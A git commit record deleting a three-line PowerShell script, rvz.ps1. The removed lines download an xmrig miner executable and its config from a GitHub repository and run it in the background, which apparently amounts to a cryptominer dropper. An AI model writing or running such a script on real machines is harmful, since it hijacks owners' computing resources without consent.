84b4d6399d536284fba2f91a04132a675be6938b
prendibs <94189491+prendibs@users.noreply.github.com>
2024-11-11 02:22:58 +0700

    Delete rvz.ps1

--- rvz.ps1
+++
@@ -1,3 +0,0 @@
-Invoke-WebRequest -Uri 'https://github.com/prendibs/s/raw/refs/heads/main/config.json' -OutFile 'config.json'
-Invoke-WebRequest -Uri 'https://github.com/prendibs/s/raw/refs/heads/main/xmrig.exe' -OutFile 'xmrig.exe'
-.\xmrig -B -c config.json
